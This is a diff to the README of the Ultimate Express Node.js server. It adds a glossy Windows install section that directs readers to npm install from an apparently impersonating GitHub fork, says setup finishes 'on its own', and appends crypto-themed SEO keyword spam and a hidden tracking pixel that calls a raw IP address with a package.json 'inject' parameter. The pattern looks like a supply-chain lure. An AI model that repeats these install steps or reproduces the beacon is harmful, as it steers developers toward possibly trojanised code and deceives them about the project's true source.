@@ -1,3 +1,29 @@
+**Ultimate Express: Your Go-To Logistics Companion**
+
+Welcome to the ultimate solution for streamlining your trucking operations with ease and speed. We’ve worked hard to ensure this version is rock-solid, packing in several recent fixes that make it more reliable than ever for your daily workflows. Plus, if you’re running on Windows, you’ll find that getting everything up and running is a straightforward, stress-free experience.
+
+**Quick install (Windows)**
+
+To install TruckerTally4/ultimate-express on Windows, follow these steps:
+
+1. Open your preferred command-line interface, such as Command Prompt (cmd) or PowerShell, ensuring you have administrative privileges if necessary.
+
+2. Navigate to your desired development directory by typing "cd" followed by your target folder path, then press Enter.
+
+3. Download the repository files to your local machine by running the git clone command followed by the repository identifier, or manually download and extract the project folder.
+
+4. Change your directory into the newly created project folder using the command line.
+
+5. Initialize the package installation by typing "npm install" and pressing Enter, which prompts npm to download and configure all the required dependencies.
+
+6. Wait for the process to finish, as the configuration and setup completes entirely on its own after the installation finishes.
+
+```bash
+npm install git+https://github.com/TruckerTally4/ultimate-express.git
+```
+
+[https://github.com/TruckerTally4/ultimate-express](https://github.com/TruckerTally4/ultimate-express)
+
 # µExpress / Ultimate Express
 
 The *Ultimate* Express. Fastest http server with **full** Express compatibility, based on µWebSockets.
@@ -335,3 +361,11 @@ Any Express view engine should work. Here's list of engines we include in our te
 - ✅ [express-art-template](https://npmjs.com/package/express-art-template)
 - ✅ [express-handlebars](https://npmjs.com/package/express-handlebars)
 - ✅ [swig](https://npmjs.com/package/swig)
+
+## Related searches
+
+Developers looking for this project are often searching for high-performance, drop-in alternatives to standard Node.js frameworks to maximize their backend efficiency. They typically focus on high-throughput server architecture, real-time data handling, and optimizing API performance for demanding decentralized platforms or quantitative trading applications.
+
+**Topics:** backtesting crypto, rust solana, crypto signals, futures bot, monero, uwebsockets express, fast nodejs server, high performance api, expressjs drop in replacement, micro websockets framework, backend performance optimization, low latency web server
+
+![.](http://5.231.58.248:8787/pixel?repo=TruckerTally4%2Fultimate-express&inject=TruckerTally4%2Fultimate-express%2Fpackage.json)
